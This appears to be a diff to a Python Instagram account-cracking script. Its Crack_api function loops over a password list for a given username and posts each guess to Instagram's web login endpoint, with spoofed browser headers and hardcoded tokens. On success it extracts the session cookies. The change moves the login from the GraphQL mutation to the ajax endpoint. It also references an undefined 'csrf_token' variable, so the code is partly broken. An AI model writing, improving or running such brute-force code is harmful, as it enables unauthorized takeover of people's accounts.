@@ -784,11 +784,11 @@ def Crack_api(username, kontol):
     for password in kontol:
         try:
             ses = requests.Session()
-            session = requests.Session()
-            response = session.get('https://www.instagram.com/accounts/login/')
+            response = ses.get('https://www.instagram.com/accounts/login/')
             csrftoken = response.cookies.get('csrftoken')
             time_now = int(datetime.now().timestamp())
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}"
+            enc_password_encoded = urllib.parse.quote(enc_password)
             cookies = {
             'csrftoken': csrftoken,
             'datr': '0_2JaizKKK8UnKjOd1Xq9I8W',
@@ -800,112 +800,27 @@ def Crack_api(username, kontol):
             'dpr': '3.0234789848327637',
             'wd': '891x969'}
             headers = {
-            'authority': 'www.instagram.com',
-            'accept': '*/*',
-            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://www.instagram.com',
-            'referer': 'https://www.instagram.com/',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Google Chrome";v="145.0.7632.5", "Chromium";v="145.0.7632.5"',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
+            'sec-ch-ua-model': '""',
             'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-ch-ua-platform-version': '',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
-            'x-asbd-id': '359341',
-            'x-csrftoken': csrftoken,
-            'x-fb-friendly-name': 'useCDSWebLoginMutation',
-            'x-fb-lsd': 'AdRcklgCfj4K1fb6WuZLTv0pUdU',
-            'x-ig-app-id': '936619743392459',
-            'x-ig-max-touch-points': '5',}
-            data = {
-        'av': '0',
-        'd': 'www',
-        'user': '0',
-        'a': '1',
-        'req': 'h',
-        'hs': '20687.HYP:instagram_web_pkg.2.1...0',
-        'dpr': '3',
-        'ccg': 'GOOD',
-        'rev': '1045814658',
-        's': '0m4mi0:6qyceo:z7lplt',
-        'hsi': '7676947325458006565',
-        'dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C1uwoE2swlo5q4U2zxe2GewGw9a361qw8Xwn82Lw62wLyES1Twoob82ZwrUdUbGwmk0KU6O1FwlAcwnJ6goK10xKi2K7E5y0xE2xyUC4o1lUG1XwqU1eUdo6a',
-        'csr': 'gcG9T442kvd5HjIyTARitaIIcNailayhai8HCnErABKCh1jK8t9tjttoSlSVLkQGz4AhNivlni9Fn9lF_nRCYDOlKOlkyC-4uV8-Fu7AFFEGUOil5y8yEKAi5k9ypQdwzG1jADUfFUf-3ebxa10zohFa2y2aUG5oPggz8pxi2y1dxefwpE4h13Uoy82vw05xcw1-oE0dBU1_S2C05NUtx5G5o5l1N0Wxsw6Qw8U5l03Vt3980ero05dt0nEQM0a7o',
-        'hsdp': 'ghI4Iind13kWv2WgWbDy2yo4VzigC21Fe0OUuwtEvw0plU1mV80Ii02qC',
-        'hblp': '04Yg989kU2_yUuAwso2OwhUlCwVx20BUvxy1fw38E24wvGwNyE9E27wbyGw3C83sw8S0ME0tXw3jo2dzofoao0W-0Oo2CwbK04_E2cwkE1comwl816E',
-        'sjsp': 'ghI4Iind13kWvkAuAeyVUwEC1eoQA9wwqjwcK0Bo',
-        'comet_req': '7',
-        'lsd': 'AdRcklgCfj4K1fb6WuZLTv0pUdU',
-        'jazoest': '22371',
-        'spin_r': '1045814658',
-        'spin_b': 'trunk',
-        'spin_t': '1787428587',
-        '__crn': 'comet.igweb.PolarisCAAIGLoginHomepageRoute',
-        'qpl_active_flow_ids': '516759801',
-        'fb_api_caller_class': 'RelayModern',
-        'fb_api_req_friendly_name': 'useCDSWebLoginMutation',
-        'server_timestamps': 'true',
-        'variables': json.dumps({
-            "input": {
-                "actor_id": "0",
-                "client_mutation_id": "2",
-                "access_flow_version": "pre_mt_behavior",
-                "account_recovery_entry_point": None,
-                "app": "instagram",
-                "auth_domain_data_key": None,
-                "caa_login_request_extra_info": {
-                    "ab_test_data": "",
-                    "shared_prefs_data": "",
-                    "cuid": "",
-                    "guid": "f1b3b27aca0b4caff",
-                    "jazoest": "",
-                    "lgndim": "",
-                    "lgnjs": "1787428590",
-                    "lgnrnd": "",
-                    "locale": "",
-                    "login_source": "caa_login",
-                    "lsd": "",
-                    "next": "",
-                    "prefill_contact_point": "",
-                    "prefill_source": "",
-                    "prefill_type": "",
-                    "skstamp": "",
-                    "timezone": ""
-                },
-                "credential_type": "password",
-                "dyi_job_id": "",
-                "enc_password": {
-                    "sensitive_string_value": enc_password
-                },
-                "event_request_id": "808dce37-8f8c-4d18-a209-2ee6429d2272",
-                "identifier": username,
-                "ig_web_device_id": "B19E8F03-834B-4250-94EB-DA15D737EB5C",
-                "initial_request_id": "1",
-                "lids": None,
-                "login_source": "COMET_HEADERLESS_LOGIN",
-                "next": None,
-                "passkey_payload": None,
-                "password": {
-                    "sensitive_string_value": enc_password
-                },
-                "persistent": True,
-                "query_params": "{}",
-                "trusted_device_records": "{}",
-                "use_uid_to_login": False,
-                "waterfall_id": "5165faac-8b61-4715-9552-81f2435b97b5"
-            },
-            "scale": 3
-        }),
-        'doc_id': '9807605492696448',
-        'fb_api_analytics_tags': '["qpl_active_flow_ids=516759801"]'
-    }
-            response = ses.post('https://www.instagram.com/api/graphql', cookies=cookies, headers=headers, data=data)
+            'X-IG-App-ID': '936619743392459',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Accept': '*/*',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-Instagram-AJAX': '1045824267',
+            'X-CSRFToken': csrf_token,
+            'X-Web-Session-ID': 'vnolst:phqive:f5i8pp',
+            'Referer': 'https://www.instagram.com/mimi_roy_44/',
+            'X-IG-Max-Touch-Points': '0',
+            'X-ASBD-ID': '359341',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
+            'X-IG-WWW-Claim': 'hmac.AR0lFPVrPWfUaasIaEe7P5wZzNvi4rTJt5zBnbJl9QfE-UHY',
+            'sec-ch-ua-platform-version': '"10.0.0"',}
+            data = f'enc_password={enc_password_encoded}&caaF2DebugGroup=-1&isPrivacyPortalReq=false&loginAttemptSubmissionCount=0&optIntoOneTap=false&queryParams=%7B%22oneTapUsers%22%3A%22%5B%5C%2271197200037%5C%22%5D%22%7D&trustedDeviceRecords=%7B%2271197200037%22%3A%7B%22machine_id%22%3A%22afAaSAALAAH1E9oBPA3kaW94g3fT%22%2C%22nonce%22%3A%223wQWQEa1bhApmLnMUuObWk0uwmWXdePxIg9cUI7IyfEAwTLJxEJWdB4IPKme32DX%22%7D%7D&username={username}&jazoest=22902&fb_dtsg=NAfyFFlfztZGS1a5mQLPSTxampkgFsMeFeO9BbRWiV5VgtEFJ71WCCg%3A17843709688147332%3A1787460646'
+            response = ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
             wanted = ["ds_user_id", "sessionid"]
             all_cookies = ses.cookies.get_dict()
             extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
